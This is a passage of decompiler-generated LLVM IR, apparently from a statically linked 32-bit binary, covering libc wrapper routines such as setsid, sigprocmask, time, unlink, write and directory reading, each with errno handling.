  %v2_805247c = inttoptr i32 %v1_8052475 to i32*
  store i32 %v1_805247a, i32* %v2_805247c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8052484.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8052481

dec_label_pc_8052481:                             ; preds = %dec_label_pc_8052448, %dec_label_pc_8052475
  %v2_8052484 = phi i32 [ %v0_8052449, %dec_label_pc_8052448 ], [ %v2_8052484.pre, %dec_label_pc_8052475 ]
  %v0_8052481 = phi i32 [ %v1_8052469, %dec_label_pc_8052448 ], [ -1, %dec_label_pc_8052475 ]
  store i32 %v2_8052484, i32* @esi, align 4
  ret i32 %v0_8052481

; uselistorder directives
  uselistorder i32 %v1_8052469, { 1, 0, 2 }
  uselistorder i32 %v0_8052461, { 1, 0 }
  uselistorder label %dec_label_pc_8052481, { 1, 0 }
}

define i32 @function_8052487() local_unnamed_addr {
dec_label_pc_8052487:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052487 = load i32, i32* @ebx, align 4
  store i32 %v0_8052487, i32* %stack_var_-4, align 4
  %v1_8052490 = call i32 @setsid(i32 %v0_8052487)
  store i32 %v1_8052490, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052490, -4095
  br i1 %tmp7, label %dec_label_pc_80524a7, label %dec_label_pc_805249b

dec_label_pc_805249b:                             ; preds = %dec_label_pc_8052487
  %v1_805249b = call i32 @function_8052779(i32 %v0_8052487)
  %v0_80524a0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80524a0 = sub i32 0, %v0_80524a0
  %v2_80524a2 = inttoptr i32 %v1_805249b to i32*
  store i32 %v1_80524a0, i32* %v2_80524a2, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80524ab.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80524a7

dec_label_pc_80524a7:                             ; preds = %dec_label_pc_8052487, %dec_label_pc_805249b
  %v2_80524ab = phi i32 [ %v0_8052487, %dec_label_pc_8052487 ], [ %v2_80524ab.pre, %dec_label_pc_805249b ]
  %v0_80524a7 = phi i32 [ %v1_8052490, %dec_label_pc_8052487 ], [ -1, %dec_label_pc_805249b ]
  store i32 %v2_80524ab, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80524a7

; uselistorder directives
  uselistorder i32 %v1_8052490, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80524a7, { 1, 0 }
}

define i32 @function_80524ad(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80524ad:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_80524ae = load i32, i32* @esi, align 4
  %v4_80524b2 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_80524b2, i32* @ecx, align 4
  %v2_80524be = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_80524be, label %dec_label_pc_80524d7, label %dec_label_pc_80524c2

dec_label_pc_80524c2:                             ; preds = %dec_label_pc_80524ad
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_80524d7, label %dec_label_pc_80524c7

dec_label_pc_80524c7:                             ; preds = %dec_label_pc_80524c2
  %v1_80524c7 = call i32 @function_8052779(i32 %v0_80524ae)
  %v1_80524cc = inttoptr i32 %v1_80524c7 to i32*
  store i32 22, i32* %v1_80524cc, align 4
  br label %dec_label_pc_80524fe

dec_label_pc_80524d7:                             ; preds = %dec_label_pc_80524c2, %dec_label_pc_80524ad
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_80524dc = load i32, i32* @ebx, align 4
  %v7_80524e4 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_80524dc, i32* @ebx, align 4
  store i32 %v7_80524e4, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_80524e4, -4095
  br i1 %tmp12, label %dec_label_pc_80524fe, label %dec_label_pc_80524f0

dec_label_pc_80524f0:                             ; preds = %dec_label_pc_80524d7
  %v1_80524f0 = call i32 @function_8052779(i32 %v0_80524dc)
  %v0_80524f5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80524f5 = sub i32 0, %v0_80524f5
  %v2_80524f7 = inttoptr i32 %v1_80524f0 to i32*
  store i32 %v1_80524f5, i32* %v2_80524f7, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80524fe

dec_label_pc_80524fe:                             ; preds = %dec_label_pc_80524f0, %dec_label_pc_80524d7, %dec_label_pc_80524c7
  %storemerge = phi i32 [ -1, %dec_label_pc_80524c7 ], [ %v7_80524e4, %dec_label_pc_80524d7 ], [ -1, %dec_label_pc_80524f0 ]
  %v2_80524fe = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80524fe, i32* @edx, align 4
  store i32 %v0_80524ae, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_80524e4, { 1, 0, 2 }
  uselistorder i32 %v0_80524dc, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_8052502(i32* %arg1) local_unnamed_addr {
dec_label_pc_8052502:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052502 = load i32, i32* @edi, align 4
  store i32 %v0_8052502, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_805250a = load i32, i32* @ebx, align 4
  %v2_8052512 = call i32 @time(i32* %arg1)
  store i32 %v0_805250a, i32* @ebx, align 4
  store i32 %v2_8052512, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v2_8052512, -4095
  br i1 %tmp10, label %dec_label_pc_805252a, label %dec_label_pc_805251e

dec_label_pc_805251e:                             ; preds = %dec_label_pc_8052502
  %v1_805251e = call i32 @function_8052779(i32 %v0_805250a)
  %v0_8052523 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052523 = sub i32 0, %v0_8052523
  %v2_8052525 = inttoptr i32 %v1_805251e to i32*
  store i32 %v1_8052523, i32* %v2_8052525, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_805252e.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805252a

dec_label_pc_805252a:                             ; preds = %dec_label_pc_8052502, %dec_label_pc_805251e
  %v2_805252e = phi i32 [ %v0_8052502, %dec_label_pc_8052502 ], [ %v2_805252e.pre, %dec_label_pc_805251e ]
  %v0_805252a = phi i32 [ %v2_8052512, %dec_label_pc_8052502 ], [ -1, %dec_label_pc_805251e ]
  %v2_805252c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805252c, i32* @edx, align 4
  store i32 %v2_805252e, i32* @edi, align 4
  ret i32 %v0_805252a

; uselistorder directives
  uselistorder i32 %v2_8052512, { 1, 0, 2 }
  uselistorder i32 %v0_805250a, { 1, 0 }
  uselistorder label %dec_label_pc_805252a, { 1, 0 }
}

define i32 @function_8052530() local_unnamed_addr {
dec_label_pc_8052530:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8052530 = load i32, i32* @edi, align 4
  store i32 %v0_8052530, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v0_8052538 = load i32, i32* @ebx, align 4
  %v1_8052539 = inttoptr i32 %tmp to i8*
  %v3_8052540 = call i32 @unlink(i8* %v1_8052539)
  store i32 %v0_8052538, i32* @ebx, align 4
  store i32 %v3_8052540, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_8052540, -4095
  br i1 %tmp9, label %dec_label_pc_8052558, label %dec_label_pc_805254c

dec_label_pc_805254c:                             ; preds = %dec_label_pc_8052530
  %v1_805254c = call i32 @function_8052779(i32 %v0_8052538)
  %v0_8052551 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052551 = sub i32 0, %v0_8052551
  %v2_8052553 = inttoptr i32 %v1_805254c to i32*
  store i32 %v1_8052551, i32* %v2_8052553, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_805255c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052558

dec_label_pc_8052558:                             ; preds = %dec_label_pc_8052530, %dec_label_pc_805254c
  %v2_805255c = phi i32 [ %v0_8052530, %dec_label_pc_8052530 ], [ %v2_805255c.pre, %dec_label_pc_805254c ]
  %v0_8052558 = phi i32 [ %v3_8052540, %dec_label_pc_8052530 ], [ -1, %dec_label_pc_805254c ]
  store i32 %v2_805255c, i32* @edi, align 4
  ret i32 %v0_8052558

; uselistorder directives
  uselistorder i32 %v3_8052540, { 1, 0, 2 }
  uselistorder i32 %v0_8052538, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_8052558, { 1, 0 }
}

define i32 @function_805255e(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805255e:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805255e = load i32, i32* @edi, align 4
  store i32 %v0_805255e, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805256e = load i32, i32* @ebx, align 4
  %v4_8052576 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_8052576, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_8052576, -4095
  br i1 %tmp12, label %dec_label_pc_805258e, label %dec_label_pc_8052582

dec_label_pc_8052582:                             ; preds = %dec_label_pc_805255e
  %v1_8052582 = call i32 @function_8052779(i32 %v0_805256e)
  %v0_8052587 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052587 = sub i32 0, %v0_8052587
  %v2_8052589 = inttoptr i32 %v1_8052582 to i32*
  store i32 %v1_8052587, i32* %v2_8052589, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052592.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805258e

dec_label_pc_805258e:                             ; preds = %dec_label_pc_805255e, %dec_label_pc_8052582
  %v2_8052592 = phi i32 [ %v0_805255e, %dec_label_pc_805255e ], [ %v2_8052592.pre, %dec_label_pc_8052582 ]
  %v0_805258e = phi i32 [ %v4_8052576, %dec_label_pc_805255e ], [ -1, %dec_label_pc_8052582 ]
  store i32 %v2_8052592, i32* %edi.global-to-local, align 4
  ret i32 %v0_805258e

; uselistorder directives
  uselistorder i32 %v4_8052576, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805258e, { 1, 0 }
}

define i32 @function_8052594() local_unnamed_addr {
dec_label_pc_8052594:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-28 = alloca i32, align 4
  %v0_8052594 = load i32, i32* @edi, align 4
  %v0_8052595 = load i32, i32* @esi, align 4
  %v0_8052596 = load i32, i32* @ebx, align 4
  %v12_8052597 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp, i32* @edi, align 4
  %v1_805259e = inttoptr i32 %tmp to i32*
  %v2_805259e = load i32, i32* %v1_805259e, align 4
  %v12_805259e = icmp eq i32 %v2_805259e, -1
  %v1_80525a1 = icmp eq i1 %v12_805259e, false
  br i1 %v1_80525a1, label %dec_label_pc_80525b3, label %dec_label_pc_80525a3

dec_label_pc_80525a3:                             ; preds = %dec_label_pc_8052594
  %v1_80525a3 = call i32 @function_8052779(i32 %v0_8052596)
  %v1_80525a8 = inttoptr i32 %v1_80525a3 to i32*
  store i32 9, i32* %v1_80525a8, align 4
  br label %dec_label_pc_80525fd

dec_label_pc_80525b3:                             ; preds = %dec_label_pc_8052594
  %v1_80525b3 = add i32 %tmp, 24
  store i32 %v12_8052597, i32* @esi, align 4
  %v2_80525c2 = call i32 @function_8054100(i32 %v12_8052597, i32 134562045)
  %v1_80525ca = call i32 @function_80540fd(i32 %v1_80525b3)
  store i32 %v1_80525ca, i32* @eax, align 4
  %v0_80525cf = load i32, i32* @edi, align 4
  %v1_80525cf = inttoptr i32 %v0_80525cf to i32*
  %v2_80525cf = load i32, i32* %v1_80525cf, align 4
  store i32 %v2_80525cf, i32* @ebx, align 4
  store i32 -1, i32* %v1_80525cf, align 4
  %v2_80525dc = call i32 @function_8054100(i32 %v12_8052597, i32 1)
  %v0_80525e2 = load i32, i32* @edi, align 4
  %v1_80525e2 = add i32 %v0_80525e2, 12
  %v2_80525e2 = inttoptr i32 %v1_80525e2 to i32*
  %v3_80525e2 = load i32, i32* %v2_80525e2, align 4
  %v1_80525e5 = call i32 @function_8053999(i32 %v3_80525e2)
  %v0_80525ea = load i32, i32* @edi, align 4
  %v1_80525ed = call i32 @function_8053999(i32 %v0_80525ea)
  %v0_80525f2 = load i32, i32* @ebx, align 4
  %v1_80525f5 = call i32 @function_8052241(i32 %v0_80525f2)
  br label %dec_label_pc_80525fd

dec_label_pc_80525fd:                             ; preds = %dec_label_pc_80525a3, %dec_label_pc_80525b3
  %v0_8052603 = phi i32 [ -1, %dec_label_pc_80525a3 ], [ %v1_80525f5, %dec_label_pc_80525b3 ]
  store i32 %v0_8052596, i32* @ebx, align 4
  store i32 %v0_8052595, i32* @esi, align 4
  store i32 %v0_8052594, i32* @edi, align 4
  ret i32 %v0_8052603

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80525fd, { 1, 0 }
}

define i32 @function_8052604(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052604:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8052604 = load i32, i32* @edi, align 4
  %v0_8052606 = load i32, i32* @ebx, align 4
  store i32 %v0_8052606, i32* %stack_var_-12, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-124, align 4
  %v2_8052615 = inttoptr i32 %arg1 to i8*
  %v3_8052615 = call i32 @function_8052352(i8* %v2_8052615, i32 67584)
  store i32 %v3_8052615, i32* %eax.global-to-local, align 4
  store i32 %v3_8052615, i32* @edi, align 4
  %v2_805261f = icmp slt i32 %v3_8052615, 0
  br i1 %v2_805261f, label %dec_label_pc_80526ec, label %dec_label_pc_8052627

dec_label_pc_8052627:                             ; preds = %dec_label_pc_8052604
  %v0_8052627 = load i32, i32* @ebx, align 4
  %v2_8052629 = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v2_8052629, i32* %eax.global-to-local, align 4
  store i32 %v3_8052615, i32* %stack_var_-124, align 4
  %v4_805262f = call i32 @function_80544fa(i32 %v3_8052615, i32 %v2_8052629, i32 %v0_8052627, i32 %v0_8052627)
  store i32 %v4_805262f, i32* %eax.global-to-local, align 4
  %v2_8052637 = icmp slt i32 %v4_805262f, 0
  br i1 %v2_8052637, label %dec_label_pc_805264d, label %dec_label_pc_805263b

dec_label_pc_805263b:                             ; preds = %dec_label_pc_8052627
  %v0_8052640 = load i32, i32* @edi, align 4
  store i32 %v0_8052640, i32* %stack_var_-124, align 4
  %v3_8052641 = call i32 @function_805217d(i32 %v0_8052640, i32 2, i32 1)
  store i32 %v3_8052641, i32* %eax.global-to-local, align 4
  %v2_8052649 = icmp slt i32 %v3_8052641, 0
  %v1_805264b = icmp eq i1 %v2_8052649, false
  br i1 %v1_805264b, label %dec_label_pc_8052663, label %dec_label_pc_805264d

dec_label_pc_805264d:                             ; preds = %dec_label_pc_805263b, %dec_label_pc_8052627
  %v0_805264d = load i32, i32* %stack_var_-124, align 4
  %v1_805264d = call i32 @function_8052779(i32 %v0_805264d)
  store i32 %v1_805264d, i32* %eax.global-to-local, align 4
  store i32 %v1_805264d, i32* @ebx, align 4
  %v1_8052657 = inttoptr i32 %v1_805264d to i32*
  %v2_8052657 = load i32, i32* %v1_8052657, align 4
  %v0_8052659 = load i32, i32* @edi, align 4
  store i32 %v0_8052659, i32* %stack_var_-124, align 4
  %v1_805265a = call i32 @function_8052241(i32 %v0_8052659)
  store i32 %v1_805265a, i32* %eax.global-to-local, align 4
  %v1_805265f = load i32, i32* @ebx, align 4
  %v2_805265f = inttoptr i32 %v1_805265f to i32*
  store i32 %v2_8052657, i32* %v2_805265f, align 4
  br label %dec_label_pc_80526d8

dec_label_pc_8052663:                             ; preds = %dec_label_pc_805263b
  store i32 48, i32* %stack_var_-124, align 4
  %v1_8052668 = call i32 @function_8052bd4(i32 48)
  store i32 %v1_8052668, i32* %eax.global-to-local, align 4
  store i32 %v1_8052668, i32* @ebx, align 4
  %v1_8052672 = icmp eq i32 %v1_8052668, 0
  br i1 %v1_8052672, label %dec_label_pc_80526c4, label %dec_label_pc_8052676

dec_label_pc_8052676:                             ; preds = %dec_label_pc_8052663
  %v0_8052676 = load i32, i32* @edi, align 4
  %v2_8052676 = inttoptr i32 %v1_8052668 to i32*
  store i32 %v0_8052676, i32* %v2_8052676, align 4
  %v1_8052678 = add i32 %v1_8052668, 16
  %v2_8052678 = inttoptr i32 %v1_8052678 to i32*
  store i32 0, i32* %v2_8052678, align 4
  %v1_805267f = add i32 %v1_8052668, 8
  %v2_805267f = inttoptr i32 %v1_805267f to i32*
  store i32 0, i32* %v2_805267f, align 4
  %v1_8052686 = add i32 %v1_8052668, 4
  %v2_8052686 = inttoptr i32 %v1_8052686 to i32*
  store i32 0, i32* %v2_8052686, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v1_8052691 = load i32, i32* @ebx, align 4
  %v2_8052691 = add i32 %v1_8052691, 20
  %v3_8052691 = inttoptr i32 %v2_8052691 to i32*
  store i32 %tmp, i32* %v3_8052691, align 4
  %v0_8052694 = load i32, i32* %eax.global-to-local, align 4
  %v6_8052699 = icmp ugt i32 %v0_8052694, 511
  br i1 %v6_8052699, label %dec_label_pc_80526a2, label %dec_label_pc_805269b

dec_label_pc_805269b:                             ; preds = %dec_label_pc_8052676
  %v0_805269b = load i32, i32* @ebx, align 4
  %v1_805269b = add i32 %v0_805269b, 20
  %v2_805269b = inttoptr i32 %v1_805269b to i32*
  store i32 512, i32* %v2_805269b, align 4
  br label %dec_label_pc_80526a2

dec_label_pc_80526a2:                             ; preds = %dec_label_pc_8052676, %dec_label_pc_805269b
  %v0_80526a4 = load i32, i32* @ebx, align 4
  %v1_80526a4 = add i32 %v0_80526a4, 20
  %v2_80526a4 = inttoptr i32 %v1_80526a4 to i32*
  %v3_80526a4 = load i32, i32* %v2_80526a4, align 4
  store i32 1, i32* %stack_var_-124, align 4
  %v3_80526a9 = call i32 @function_8053348(i64 1, i32 %v3_80526a4)
  store i32 %v3_80526a9, i32* %eax.global-to-local, align 4
  %v1_80526b1 = load i32, i32* @ebx, align 4
  %v2_80526b1 = add i32 %v1_80526b1, 12
  %v3_80526b1 = inttoptr i32 %v2_80526b1 to i32*
  store i32 %v3_80526a9, i32* %v3_80526b1, align 4
  %v1_80526b4 = icmp eq i32 %v3_80526a9, 0
  %v1_80526b6 = icmp eq i1 %v1_80526b4, false
  br i1 %v1_80526b6, label %dec_label_pc_80526dc, label %dec_label_pc_80526b8

dec_label_pc_80526b8:                             ; preds = %dec_label_pc_80526a2
  %v0_80526bb = load i32, i32* @ebx, align 4
  store i32 %v0_80526bb, i32* %stack_var_-124, align 4
  %v1_80526bc = call i32 @function_8053999(i32 %v0_80526bb)
  store i32 %v1_80526bc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80526c4

dec_label_pc_80526c4:                             ; preds = %dec_label_pc_8052663, %dec_label_pc_80526b8
  %v0_80526c7 = load i32, i32* @edi, align 4
  store i32 %v0_80526c7, i32* %stack_var_-124, align 4
  %v1_80526c8 = call i32 @function_8052241(i32 %v0_80526c7)
  store i32 %v1_80526c8, i32* %eax.global-to-local, align 4
  %v1_80526cd = call i32 @function_8052779(i32 %v0_80526c7)
  store i32 %v1_80526cd, i32* %eax.global-to-local, align 4
  %v1_80526d2 = inttoptr i32 %v1_80526cd to i32*
  store i32 12, i32* %v1_80526d2, align 4
  br label %dec_label_pc_80526d8

dec_label_pc_80526d8:                             ; preds = %dec_label_pc_805264d, %dec_label_pc_80526c4
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80526e9

dec_label_pc_80526dc:                             ; preds = %dec_label_pc_80526a2
  %v0_80526de = load i32, i32* @ebx, align 4
  %v1_80526de = add i32 %v0_80526de, 24
  store i32 %v1_80526de, i32* %eax.global-to-local, align 4
  store i32 %v1_80526de, i32* %stack_var_-124, align 4
  %v1_80526e4 = call i32 @function_80540fd(i32 %v1_80526de)
  store i32 %v1_80526e4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80526e9

dec_label_pc_80526e9:                             ; preds = %dec_label_pc_80526d8, %dec_label_pc_80526dc
  %v2_80526f1.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_80526ec

dec_label_pc_80526ec:                             ; preds = %dec_label_pc_8052604, %dec_label_pc_80526e9
  %v2_80526f1 = phi i32 [ %v0_8052606, %dec_label_pc_8052604 ], [ %v2_80526f1.pre, %dec_label_pc_80526e9 ]
  %v0_80526ef = load i32, i32* @ebx, align 4
  store i32 %v0_80526ef, i32* %eax.global-to-local, align 4
  store i32 %v2_80526f1, i32* @ebx, align 4
  store i32 %v0_8052604, i32* @edi, align 4
  ret i32 %v0_80526ef

; uselistorder directives
  uselistorder i32 %v3_80526a9, { 1, 0, 2 }
  uselistorder i32 %v1_8052668, { 0, 1, 5, 2, 4, 3, 6 }
  uselistorder i32 %v1_805264d, { 1, 0, 2 }
  uselistorder i32 %v3_8052615, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-124, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i64, i32)* @function_8053348, { 1, 0, 2 }
  uselistorder i32 512, { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @function_8052241, { 12, 11, 10, 22, 21, 18, 17, 20, 16, 19, 15, 14, 13, 3, 5, 9, 8, 7, 6, 4, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80526ec, { 1, 0 }
  uselistorder label %dec_label_pc_80526e9, { 1, 0 }
  uselistorder label %dec_label_pc_80526d8, { 1, 0 }
  uselistorder label %dec_label_pc_80526c4, { 1, 0 }
  uselistorder label %dec_label_pc_80526a2, { 1, 0 }
}

define i32 @function_80526f5() local_unnamed_addr {
dec_label_pc_80526f5:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80526f5 = load i32, i32* @esi, align 4
  %v0_80526f6 = load i32, i32* @ebx, align 4
  store i32 %v0_80526f6, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* @esi, align 4
  %v1_80526fe = add i32 %tmp, 24
  store i32 %v1_80526fe, i32* @ebx, align 4
  %v2_8052707 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8052707, i32* @eax, align 4
  %v2_805270c = call i32 @function_8054100(i32 %v2_8052707, i32 134562045)
  %v0_8052711 = load i32, i32* @ebx, align 4
  %v1_8052714 = call i32 @function_80540fd(i32 %v0_8052711)
  br label %dec_label_pc_805271c

dec_label_pc_805271c:                             ; preds = %dec_label_pc_8052747, %dec_label_pc_80526f5
  %v0_805271c = load i32, i32* @esi, align 4
  %v1_805271c = add i32 %v0_805271c, 8
  %v2_805271c = inttoptr i32 %v1_805271c to i32*
  %v3_805271c = load i32, i32* %v2_805271c, align 4
  %v2_805271f = add i32 %v0_805271c, 4
  %v3_805271f = inttoptr i32 %v2_805271f to i32*
  %v4_805271f = load i32, i32* %v3_805271f, align 4
  %v6_8052722 = icmp ugt i32 %v3_805271c, %v4_805271f
  br i1 %v6_8052722, label %dec_label_pc_8052747, label %dec_label_pc_8052724

dec_label_pc_8052724:                             ; preds = %dec_label_pc_805271c
  %v0_8052724 = load i32, i32* @edx, align 4
  %v1_8052725 = add i32 %v0_805271c, 20
  %v2_8052725 = inttoptr i32 %v1_8052725 to i32*
  %v3_8052725 = load i32, i32* %v2_8052725, align 4
  %v1_8052728 = add i32 %v0_805271c, 12
  %v2_8052728 = inttoptr i32 %v1_8052728 to i32*
  %v3_8052728 = load i32, i32* %v2_8052728, align 4
  %v1_805272b = inttoptr i32 %v0_805271c to i32*
  %v2_805272b = load i32, i32* %v1_805272b, align 4
  %v4_805272d = call i32 @function_8054542(i32 %v2_805272b, i32 %v3_8052728, i32 %v3_8052725, i32 %v0_8052724)
  %tmp12 = icmp slt i32 %v4_805272d, 1
  %tmp13 = icmp eq i1 %tmp12, false
  br i1 %tmp13, label %dec_label_pc_805273d, label %dec_label_pc_8052739

dec_label_pc_8052739:                             ; preds = %dec_label_pc_8052724
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8052763

dec_label_pc_805273d:                             ; preds = %dec_label_pc_8052724
  %v1_805273d = load i32, i32* @esi, align 4
  %v2_805273d = add i32 %v1_805273d, 8
  %v3_805273d = inttoptr i32 %v2_805273d to i32*
  store i32 %v4_805272d, i32* %v3_805273d, align 4
  %v0_8052740 = load i32, i32* @esi, align 4
  %v1_8052740 = add i32 %v0_8052740, 4
  %v2_8052740 = inttoptr i32 %v1_8052740 to i32*
  store i32 0, i32* %v2_8052740, align 4
  %v0_8052747.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052747

dec_label_pc_8052747:                             ; preds = %dec_label_pc_805271c, %dec_label_pc_805273d
  %v1_8052755 = phi i32 [ %v0_805271c, %dec_label_pc_805271c ], [ %v0_8052747.pre, %dec_label_pc_805273d ]
  %v1_8052747 = add i32 %v1_8052755, 4
  %v2_8052747 = inttoptr i32 %v1_8052747 to i32*
  %v3_8052747 = load i32, i32* %v2_8052747, align 4
  %v2_805274c = add i32 %v1_8052755, 12
  %v3_805274c = inttoptr i32 %v2_805274c to i32*
  %v4_805274c = load i32, i32* %v3_805274c, align 4
  %v5_805274c = add i32 %v4_805274c, %v3_8052747
  store i32 %v5_805274c, i32* @ebx, align 4
  %v1_805274f = add i32 %v5_805274c, 8
  %v2_805274f = inttoptr i32 %v1_805274f to i16*
  %v3_805274f = load i16, i16* %v2_805274f, align 2
  %v4_805274f = zext i16 %v3_805274f to i32
  store i32 %v4_805274f, i32* @edx, align 4
  %v2_8052753 = add i32 %v4_805274f, %v3_8052747
  store i32 %v2_8052753, i32* %v2_8052747, align 4
  %v0_8052758 = load i32, i32* @ebx, align 4
  %v1_8052758 = add i32 %v0_8052758, 4
  %v2_8052758 = inttoptr i32 %v1_8052758 to i32*
  %v3_8052758 = load i32, i32* %v2_8052758, align 4
  %v1_805275b = load i32, i32* @esi, align 4
  %v2_805275b = add i32 %v1_805275b, 16
  %v3_805275b = inttoptr i32 %v2_805275b to i32*
  store i32 %v3_8052758, i32* %v3_805275b, align 4
  %v0_805275e = load i32, i32* @ebx, align 4
  %v1_805275e = inttoptr i32 %v0_805275e to i32*
  %v2_805275e = load i32, i32* %v1_805275e, align 4
  %v3_805275e = icmp eq i32 %v2_805275e, 0
  br i1 %v3_805275e, label %dec_label_pc_805271c, label %dec_label_pc_8052763.loopexit

dec_label_pc_8052763.loopexit:                    ; preds = %dec_label_pc_8052747
  br label %dec_label_pc_8052763

dec_label_pc_8052763:                             ; preds = %dec_label_pc_8052763.loopexit, %dec_label_pc_8052739
  store i32 %v2_8052707, i32* @eax, align 4
  %v2_805276c = call i32 @function_8054100(i32 %v2_8052707, i32 1)
  %v0_8052771 = load i32, i32* @ebx, align 4
  %v2_8052776 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052776, i32* @ebx, align 4
  store i32 %v0_80526f5, i32* @esi, align 4
  ret i32 %v0_8052771

; uselistorder directives
  uselistorder i32 %v1_8052755, { 1, 0 }
  uselistorder i32 %v0_805271c, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_8052747, { 1, 0 }
}

define i32 @function_8052779(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052779:
  ret i32 ptrtoint (i32* @global_var_80569b4.203 to i32)
}

define i32 @function_805277f() local_unnamed_addr {
dec_label_pc_805277f:
  %tmp = call i64 @__decompiler_undefined_function_5()
  %stack_var_-16 = alloca i32, align 4
  %v1_8052787 = bitcast i32* %stack_var_-16 to %tms*
  %v2_8052787 = call i32 @function_8054917(%tms* %v1_8052787)
  %v4_805278c = trunc i64 %tmp to i32
  %v4_8052790 = load i32, i32* %stack_var_-16, align 4
  %v5_8052790 = add i32 %v4_8052790, %v4_805278c
  %v3_8052797 = mul i32 %v5_8052790, 10000
  %v1_805279d = and i32 %v3_8052797, 2147483632
  ret i32 %v1_805279d

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_80527a3(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80527a3:
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_80527a4 = load i32, i32* @esi, align 4
  store i32 %v0_80527a4, i32* %stack_var_-8, align 4
  %v4_80527a5 = ptrtoint i8* %arg1 to i32
